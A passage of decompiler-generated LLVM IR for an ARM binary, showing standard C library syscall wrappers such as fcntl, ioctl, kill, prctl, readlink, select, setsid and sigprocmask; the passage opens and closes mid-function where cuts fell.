  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_12a54, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_12a10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_129fcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12ad8 = sdiv i32 %arg1, %arg2
  ret i32 %v2_12ad8
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_12af4 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_12af4
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_12b10 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12b10, 2
  br i1 %tmp, label %dec_label_pc_12b4c, label %dec_label_pc_12b28

dec_label_pc_12b28:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_12b80, label %dec_label_pc_12b3c

dec_label_pc_12b3c:                               ; preds = %dec_label_pc_12b28
  %v0_12b40 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12b74

dec_label_pc_12b4c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_12b68, label %dec_label_pc_12b80

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b4c
  %v0_12b6c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12b74

dec_label_pc_12b74:                               ; preds = %dec_label_pc_12b3c, %dec_label_pc_12b68
  %storemerge2 = phi i32 [ %v0_12b40, %dec_label_pc_12b3c ], [ %v0_12b6c, %dec_label_pc_12b68 ]
  %storemerge.in = load i16, i16* @global_var_24150.533, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_12b74 = load i32, i32* %r2.global-to-local, align 4
  %v1_12b74 = sub i32 0, %v0_12b74
  store i32 %v1_12b74, i32* %r2.global-to-local, align 4
  %v3_12b78 = add i32 %storemerge, %storemerge2
  %v4_12b78 = inttoptr i32 %v3_12b78 to i32*
  store i32 %v1_12b74, i32* %v4_12b78, align 4
  br label %dec_label_pc_12b80

dec_label_pc_12b80:                               ; preds = %dec_label_pc_12b28, %dec_label_pc_12b4c, %dec_label_pc_12b74
  %storemerge1 = phi i32 [ -1, %dec_label_pc_12b74 ], [ %arg1, %dec_label_pc_12b4c ], [ %arg1, %dec_label_pc_12b28 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 5, 1, 4 }
  uselistorder label %dec_label_pc_12b80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12b74, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_12b98 = load i32, i32* @r2, align 4
  %v9_12b98 = load i32, i32* @r3, align 4
  store i32 %v9_12b98, i32* %stack_var_-4, align 4
  %v3_12b9c = load i32, i32* @r4, align 4
  store i32 %v3_12b9c, i32* %stack_var_-32, align 4
  %v6_12b9c = load i32, i32* @r5, align 4
  %v12_12b9c = load i32, i32* @r7, align 4
  %v4_12bac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12972) to i32*), align 4
  %v2_12bb4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12bb4, i32* @r3, align 4
  %v2_12bb8 = icmp eq i32 %v4_12bac, 0
  %v0_12bc0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12bc0, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_12b98, i32* @r4, align 4
  br i1 %v2_12bb8, label %dec_label_pc_12bdc, label %dec_label_pc_12bd0

dec_label_pc_12bd0:                               ; preds = %entry
  %v7_12bd0 = icmp eq i32 %arg2, 7
  br i1 %v7_12bd0, label %dec_label_pc_12c1c, label %bb

bb:                                               ; preds = %dec_label_pc_12bd0
  %v8_12bd4 = icmp eq i32 %arg2, 14
  br i1 %v8_12bd4, label %dec_label_pc_12c1c, label %dec_label_pc_12bdc

dec_label_pc_12bdc:                               ; preds = %bb, %entry
  store i32 %v0_12bc0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_12bc0, -4095
  br i1 %tmp, label %dec_label_pc_12c14, label %dec_label_pc_12bfc

dec_label_pc_12bfc:                               ; preds = %dec_label_pc_12bdc
  %v0_12c00 = call i32 @__aeabi_read_tp()
  %v3_12c04 = load i16, i16* @global_var_24150.533, align 2
  %v4_12c04 = sext i16 %v3_12c04 to i32
  store i32 %v4_12c04, i32* @r3, align 4
  %v0_12c08 = load i32, i32* @r2, align 4
  %v1_12c08 = sub i32 0, %v0_12c08
  store i32 %v1_12c08, i32* @r2, align 4
  %v3_12c0c = add i32 %v4_12c04, %v0_12c00
  %v4_12c0c = inttoptr i32 %v3_12c0c to i32*
  store i32 %v1_12c08, i32* %v4_12c0c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c14

dec_label_pc_12c14:                               ; preds = %dec_label_pc_12bdc, %dec_label_pc_12bfc
  %v0_12c14 = phi i32 [ %v0_12bc0, %dec_label_pc_12bdc ], [ -1, %dec_label_pc_12bfc ]
  br label %dec_label_pc_12c68

dec_label_pc_12c1c:                               ; preds = %dec_label_pc_12bd0, %bb
  %v0_12c1c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12c1c, i32* %r6.global-to-local, align 4
  %v0_12c2c = load i32, i32* @r5, align 4
  store i32 %v0_12c2c, i32* %r0.global-to-local, align 4
  store i32 %v0_12c2c, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_12c2c, -4095
  br i1 %tmp15, label %dec_label_pc_12c5c, label %dec_label_pc_12c44

dec_label_pc_12c44:                               ; preds = %dec_label_pc_12c1c
  %v1_12c48 = sub i32 0, %v0_12c2c
  %v0_12c4c = call i32 @__aeabi_read_tp()
  store i32 %v0_12c4c, i32* %r0.global-to-local, align 4
  %v3_12c50 = load i16, i16* @global_var_24150.533, align 2
  %v4_12c50 = sext i16 %v3_12c50 to i32
  store i32 %v4_12c50, i32* @r3, align 4
  %v3_12c54 = add i32 %v4_12c50, %v0_12c4c
  %v4_12c54 = inttoptr i32 %v3_12c54 to i32*
  store i32 %v1_12c48, i32* %v4_12c54, align 4
  store i32 -1, i32* @r2, align 4
  %v0_12c5c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12c5c

dec_label_pc_12c5c:                               ; preds = %dec_label_pc_12c1c, %dec_label_pc_12c44
  %v0_12c60 = phi i32 [ %v0_12c2c, %dec_label_pc_12c1c ], [ -1, %dec_label_pc_12c44 ]
  %v0_12c5c = phi i32 [ %v0_12c1c, %dec_label_pc_12c1c ], [ %v0_12c5c.pre, %dec_label_pc_12c44 ]
  store i32 %v0_12c5c, i32* %r0.global-to-local, align 4
  store i32 %v0_12c60, i32* @r7, align 4
  %v1_12c64 = call i32 @__libc_disable_asynccancel(i32 %v0_12c5c)
  store i32 %v1_12c64, i32* %r0.global-to-local, align 4
  %v0_12c68.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12c68

dec_label_pc_12c68:                               ; preds = %dec_label_pc_12c14, %dec_label_pc_12c5c
  %v0_12c68 = phi i32 [ %v0_12c14, %dec_label_pc_12c14 ], [ %v0_12c68.pre, %dec_label_pc_12c5c ]
  store i32 %v0_12c68, i32* %r0.global-to-local, align 4
  %v2_12c70 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12c70, i32* @r4, align 4
  store i32 %v6_12b9c, i32* @r5, align 4
  store i32 %v12_12b9c, i32* @r7, align 4
  ret i32 %v0_12c68

; uselistorder directives
  uselistorder i32 %v0_12c68, { 1, 0 }
  uselistorder i32 %v0_12c5c, { 1, 0 }
  uselistorder i32 %v0_12c2c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12bc0, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_12c68, { 1, 0 }
  uselistorder label %dec_label_pc_12c5c, { 1, 0 }
  uselistorder label %dec_label_pc_12c1c, { 1, 0 }
  uselistorder label %dec_label_pc_12c14, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c8c = load i32, i32* @r7, align 4
  store i32 %v3_12c8c, i32* %stack_var_-8, align 4
  %v0_12c98 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c98, -4095
  br i1 %tmp, label %dec_label_pc_12cb8, label %dec_label_pc_12ca0

dec_label_pc_12ca0:                               ; preds = %entry
  %v1_12ca4 = sub i32 0, %v0_12c98
  %v3_12ca8 = load i16, i16* @global_var_24150.533, align 2
  %v4_12ca8 = sext i16 %v3_12ca8 to i32
  %v0_12cac = call i32 @__aeabi_read_tp()
  %v3_12cb0 = add i32 %v4_12ca8, %v0_12cac
  %v4_12cb0 = inttoptr i32 %v3_12cb0 to i32*
  store i32 %v1_12ca4, i32* %v4_12cb0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12cb8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12cb8

dec_label_pc_12cb8:                               ; preds = %entry, %dec_label_pc_12ca0
  %v1_12cbc = phi i32 [ %v0_12c98, %entry ], [ -1, %dec_label_pc_12ca0 ]
  %v2_12cb8 = phi i32 [ %v3_12c8c, %entry ], [ %v2_12cb8.pre, %dec_label_pc_12ca0 ]
  store i32 %v2_12cb8, i32* @r7, align 4
  ret i32 %v1_12cbc

; uselistorder directives
  uselistorder i32 %v0_12c98, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12cb8, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_12cd4 = load i32, i32* @r0, align 4
  ret i32 %v1_12cd4
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_12cd8 = load i32, i32* @r3, align 4
  store i32 %v9_12cd8, i32* %stack_var_-4, align 4
  %v3_12cdc = load i32, i32* @r4, align 4
  store i32 %v3_12cdc, i32* %stack_var_-32, align 4
  %v6_12cdc = load i32, i32* @r5, align 4
  %v12_12cdc = load i32, i32* @r7, align 4
  %v4_12cec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12972) to i32*), align 4
  %v2_12cf4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12cf4, i32* @r3, align 4
  %v2_12cf8 = icmp eq i32 %v4_12cec, 0
  %v0_12d00 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12d00, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_12cf8, label %dec_label_pc_12d10, label %dec_label_pc_12d48

dec_label_pc_12d10:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_12d00, -4095
  br i1 %tmp, label %dec_label_pc_12d40, label %dec_label_pc_12d28

dec_label_pc_12d28:                               ; preds = %dec_label_pc_12d10
  %v1_12d2c = sub i32 0, %v0_12d00
  %v3_12d30 = load i16, i16* @global_var_24150.533, align 2
  %v4_12d30 = sext i16 %v3_12d30 to i32
  store i32 %v4_12d30, i32* @r3, align 4
  %v0_12d34 = call i32 @__aeabi_read_tp()
  %v2_12d38 = load i32, i32* @r3, align 4
  %v3_12d38 = add i32 %v2_12d38, %v0_12d34
  %v4_12d38 = inttoptr i32 %v3_12d38 to i32*
  store i32 %v1_12d2c, i32* %v4_12d38, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d40

dec_label_pc_12d40:                               ; preds = %dec_label_pc_12d10, %dec_label_pc_12d28
  %v0_12d40 = phi i32 [ %v0_12d00, %dec_label_pc_12d10 ], [ -1, %dec_label_pc_12d28 ]
  br label %dec_label_pc_12d94

dec_label_pc_12d48:                               ; preds = %entry
  %v0_12d48 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12d48, i32* %r6.global-to-local, align 4
  %v0_12d58 = load i32, i32* @r4, align 4
  store i32 %v0_12d58, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_12d58, -4095
  br i1 %tmp15, label %dec_label_pc_12d88, label %dec_label_pc_12d70

dec_label_pc_12d70:                               ; preds = %dec_label_pc_12d48
  %v1_12d74 = sub i32 0, %v0_12d58
  %v3_12d78 = load i16, i16* @global_var_24150.533, align 2
  %v4_12d78 = sext i16 %v3_12d78 to i32
  store i32 %v4_12d78, i32* @r3, align 4
  %v0_12d7c = call i32 @__aeabi_read_tp()
  store i32 %v0_12d7c, i32* %r0.global-to-local, align 4
  %v2_12d80 = load i32, i32* @r3, align 4
  %v3_12d80 = add i32 %v2_12d80, %v0_12d7c
  %v4_12d80 = inttoptr i32 %v3_12d80 to i32*
  store i32 %v1_12d74, i32* %v4_12d80, align 4
  %v0_12d88.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12d88

dec_label_pc_12d88:                               ; preds = %dec_label_pc_12d48, %dec_label_pc_12d70
  %v0_12d8c = phi i32 [ %v0_12d58, %dec_label_pc_12d48 ], [ -1, %dec_label_pc_12d70 ]
  %v0_12d88 = phi i32 [ %v0_12d48, %dec_label_pc_12d48 ], [ %v0_12d88.pre, %dec_label_pc_12d70 ]
  store i32 %v0_12d88, i32* %r0.global-to-local, align 4
  store i32 %v0_12d8c, i32* @r7, align 4
  %v1_12d90 = call i32 @__libc_disable_asynccancel(i32 %v0_12d88)
  store i32 %v1_12d90, i32* %r0.global-to-local, align 4
  %v0_12d94.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12d94

dec_label_pc_12d94:                               ; preds = %dec_label_pc_12d40, %dec_label_pc_12d88
  %v0_12d94 = phi i32 [ %v0_12d40, %dec_label_pc_12d40 ], [ %v0_12d94.pre, %dec_label_pc_12d88 ]
  store i32 %v0_12d94, i32* %r0.global-to-local, align 4
  %v2_12d9c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12d9c, i32* @r4, align 4
  store i32 %v6_12cdc, i32* @r5, align 4
  store i32 %v12_12cdc, i32* @r7, align 4
  ret i32 %v0_12d94

; uselistorder directives
  uselistorder i32 %v0_12d94, { 1, 0 }
  uselistorder i32 %v0_12d88, { 1, 0 }
  uselistorder i32 %v0_12d58, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12d00, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_12d94, { 1, 0 }
  uselistorder label %dec_label_pc_12d88, { 1, 0 }
  uselistorder label %dec_label_pc_12d40, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12db8 = load i32, i32* @r7, align 4
  store i32 %v3_12db8, i32* %stack_var_-8, align 4
  %v0_12dc4 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12dc4, -4095
  br i1 %tmp, label %dec_label_pc_12de4, label %dec_label_pc_12dcc

dec_label_pc_12dcc:                               ; preds = %entry
  %v1_12dd0 = sub i32 0, %v0_12dc4
  %v3_12dd4 = load i16, i16* @global_var_24150.533, align 2
  %v4_12dd4 = sext i16 %v3_12dd4 to i32
  %v0_12dd8 = call i32 @__aeabi_read_tp()
  %v3_12ddc = add i32 %v4_12dd4, %v0_12dd8
  %v4_12ddc = inttoptr i32 %v3_12ddc to i32*
  store i32 %v1_12dd0, i32* %v4_12ddc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12de4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12de4

dec_label_pc_12de4:                               ; preds = %entry, %dec_label_pc_12dcc
  %v1_12de8 = phi i32 [ %v0_12dc4, %entry ], [ -1, %dec_label_pc_12dcc ]
  %v2_12de4 = phi i32 [ %v3_12db8, %entry ], [ %v2_12de4.pre, %dec_label_pc_12dcc ]
  store i32 %v2_12de4, i32* @r7, align 4
  ret i32 %v1_12de8

; uselistorder directives
  uselistorder i32 %v0_12dc4, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12de4, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12df0 = load i32, i32* @r4, align 4
  store i32 %v3_12df0, i32* %stack_var_-12, align 4
  %v0_12e00 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12e00, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e00, -4095
  br i1 %tmp, label %dec_label_pc_12e28, label %dec_label_pc_12e10

dec_label_pc_12e10:                               ; preds = %entry
  %v0_12e14 = call i32 @__aeabi_read_tp()
  %v3_12e18 = load i16, i16* @global_var_24150.533, align 2
  %v4_12e18 = sext i16 %v3_12e18 to i32
  %v0_12e1c = load i32, i32* %r2.global-to-local, align 4
  %v1_12e1c = sub i32 0, %v0_12e1c
  store i32 %v1_12e1c, i32* %r2.global-to-local, align 4
  %v3_12e20 = add i32 %v4_12e18, %v0_12e14
  %v4_12e20 = inttoptr i32 %v3_12e20 to i32*
  store i32 %v1_12e1c, i32* %v4_12e20, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12e28.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12e28

dec_label_pc_12e28:                               ; preds = %entry, %dec_label_pc_12e10
  %v1_12e2c = phi i32 [ %v0_12e00, %entry ], [ -1, %dec_label_pc_12e10 ]
  %v2_12e28 = phi i32 [ %v3_12df0, %entry ], [ %v2_12e28.pre, %dec_label_pc_12e10 ]
  store i32 %v2_12e28, i32* @r4, align 4
  ret i32 %v1_12e2c

; uselistorder directives
  uselistorder i32 %v0_12e00, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e28, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e34 = load i32, i32* @r7, align 4
  store i32 %v3_12e34, i32* %stack_var_-8, align 4
  %v0_12e40 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12e40, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_12e40, -4095
  br i1 %tmp, label %dec_label_pc_12e68, label %dec_label_pc_12e50

dec_label_pc_12e50:                               ; preds = %entry
  %v0_12e54 = call i32 @__aeabi_read_tp()
  %v3_12e58 = load i16, i16* @global_var_24150.533, align 2
  %v4_12e58 = sext i16 %v3_12e58 to i32
  store i32 %v4_12e58, i32* @r3, align 4
  %v0_12e5c = load i32, i32* @r2, align 4
  %v1_12e5c = sub i32 0, %v0_12e5c
  store i32 %v1_12e5c, i32* @r2, align 4
  %v3_12e60 = add i32 %v4_12e58, %v0_12e54
  %v4_12e60 = inttoptr i32 %v3_12e60 to i32*
  store i32 %v1_12e5c, i32* %v4_12e60, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12e68.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12e68

dec_label_pc_12e68:                               ; preds = %entry, %dec_label_pc_12e50
  %v1_12e6c = phi i32 [ %v0_12e40, %entry ], [ -1, %dec_label_pc_12e50 ]
  %v2_12e68 = phi i32 [ %v3_12e34, %entry ], [ %v2_12e68.pre, %dec_label_pc_12e50 ]
  store i32 %v2_12e68, i32* @r7, align 4
  ret i32 %v1_12e6c

; uselistorder directives
  uselistorder i32 %v0_12e40, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e68, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12e74 = load i32, i32* @r4, align 4
  store i32 %v3_12e74, i32* %stack_var_-12, align 4
  %v0_12e84 = load i32, i32* @r0, align 4
  store i32 %v0_12e84, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e84, -4095
  br i1 %tmp, label %dec_label_pc_12eac, label %dec_label_pc_12e94

dec_label_pc_12e94:                               ; preds = %entry
  %v0_12e98 = call i32 @__aeabi_read_tp()
  %v3_12e9c = load i16, i16* @global_var_24150.533, align 2
  %v4_12e9c = sext i16 %v3_12e9c to i32
  %v0_12ea0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ea0 = sub i32 0, %v0_12ea0
  store i32 %v1_12ea0, i32* %r2.global-to-local, align 4
  %v3_12ea4 = add i32 %v4_12e9c, %v0_12e98
  %v4_12ea4 = inttoptr i32 %v3_12ea4 to i32*
  store i32 %v1_12ea0, i32* %v4_12ea4, align 4
  %v2_12eac.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12eac

dec_label_pc_12eac:                               ; preds = %entry, %dec_label_pc_12e94
  %v1_12eb0 = phi i32 [ %v0_12e84, %entry ], [ -1, %dec_label_pc_12e94 ]
  %v2_12eac = phi i32 [ %v3_12e74, %entry ], [ %v2_12eac.pre, %dec_label_pc_12e94 ]
  store i32 %v2_12eac, i32* @r4, align 4
  ret i32 %v1_12eb0

; uselistorder directives
  uselistorder i32 %v0_12e84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12eac, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_12eb8 = load i32, i32* @r4, align 4
  store i32 %v3_12eb8, i32* %stack_var_-28, align 4
  %v6_12eb8 = load i32, i32* @r5, align 4
  %v9_12eb8 = load i32, i32* @r6, align 4
  %v12_12eb8 = load i32, i32* @r7, align 4
  %v15_12eb8 = load i32, i32* @r8, align 4
  %v18_12eb8 = load i32, i32* @sl, align 4
  %v21_12eb8 = load i32, i32* @lr, align 4
  %v4_12ec8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12972) to i32*), align 4
  %v2_12ed0 = icmp eq i32 %v4_12ec8, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12ed0, label %dec_label_pc_12eec, label %entry.dec_label_pc_12ef8_crit_edge

entry.dec_label_pc_12ef8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12ef8

dec_label_pc_12eec:                               ; preds = %entry
  store i32 %v3_12eb8, i32* @r4, align 4
  store i32 %v9_12eb8, i32* @r6, align 4
  store i32 %v12_12eb8, i32* @r7, align 4
  store i32 %v15_12eb8, i32* @r8, align 4
  store i32 %v18_12eb8, i32* %sl.global-to-local, align 4
  %v0_12ef4 = call i32 @__syscall_select()
  br label %dec_label_pc_12ef8

dec_label_pc_12ef8:                               ; preds = %entry.dec_label_pc_12ef8_crit_edge, %dec_label_pc_12eec
  %v0_12ef8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12ef8, i32* @r5, align 4
  %v0_12f0c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_12f0c, i32* @r0, align 4
  %v0_12f14 = call i32 @__syscall_select()
  store i32 %v0_12f14, i32* @r4, align 4
  %v0_12f1c = load i32, i32* @r5, align 4
  %v1_12f20 = call i32 @__libc_disable_asynccancel(i32 %v0_12f1c)
  %v0_12f24 = load i32, i32* @r4, align 4
  %v2_12f2c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12f2c, i32* @r4, align 4
  store i32 %v6_12eb8, i32* @r5, align 4
  store i32 %v9_12eb8, i32* @r6, align 4
  store i32 %v12_12eb8, i32* @r7, align 4
  store i32 %v15_12eb8, i32* @r8, align 4
  store i32 %v18_12eb8, i32* @sl, align 4
  store i32 %v21_12eb8, i32* @lr, align 4
  ret i32 %v0_12f24

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ef8, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f3c = load i32, i32* @r7, align 4
  store i32 %v3_12f3c, i32* %stack_var_-8, align 4
  %v0_12f48 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12f48, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12f48, -4095
  br i1 %tmp, label %dec_label_pc_12f70, label %dec_label_pc_12f58

dec_label_pc_12f58:                               ; preds = %entry
  %v0_12f5c = call i32 @__aeabi_read_tp()
  %v3_12f60 = load i16, i16* @global_var_24150.533, align 2
  %v4_12f60 = sext i16 %v3_12f60 to i32
  %v0_12f64 = load i32, i32* %r2.global-to-local, align 4
  %v1_12f64 = sub i32 0, %v0_12f64
  store i32 %v1_12f64, i32* %r2.global-to-local, align 4
  %v3_12f68 = add i32 %v4_12f60, %v0_12f5c
  %v4_12f68 = inttoptr i32 %v3_12f68 to i32*
  store i32 %v1_12f64, i32* %v4_12f68, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12f70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12f70

dec_label_pc_12f70:                               ; preds = %entry, %dec_label_pc_12f58
  %v1_12f74 = phi i32 [ %v0_12f48, %entry ], [ -1, %dec_label_pc_12f58 ]
  %v2_12f70 = phi i32 [ %v3_12f3c, %entry ], [ %v2_12f70.pre, %dec_label_pc_12f58 ]
  store i32 %v2_12f70, i32* @r7, align 4
  ret i32 %v1_12f74

; uselistorder directives
  uselistorder i32 %v0_12f48, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12f70, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_12f80 = icmp eq i32* %arg2, null
  br i1 %v2_12f80, label %dec_label_pc_12fc4, label %dec_label_pc_12f94

dec_label_pc_12f94:                               ; preds = %entry
  %v2_12f94 = load i32, i32* %arg2, align 4
  %v1_12f98 = icmp slt i32 %v2_12f94, 0
  br i1 %v1_12f98, label %dec_label_pc_12fac, label %dec_label_pc_12fa0

dec_label_pc_12fa0:                               ; preds = %dec_label_pc_12f94
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_12fa0 = load i32, i32* %.pre3, align 4
  %v1_12fa4 = urem i32 %v3_12fa0, 2
  %v2_12fa4 = icmp eq i32 %v1_12fa4, 0
  br i1 %v2_12fa4, label %dec_label_pc_12fc4, label %dec_label_pc_12fac

dec_label_pc_12fac:                               ; preds = %dec_label_pc_12f94, %dec_label_pc_12fa0
  %v2_12fac = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_12fac to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_12fc4

dec_label_pc_12fc4:                               ; preds = %dec_label_pc_12fa0, %entry, %dec_label_pc_12fac
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_12ff8, label %dec_label_pc_12fe0

dec_label_pc_12fe0:                               ; preds = %dec_label_pc_12fc4
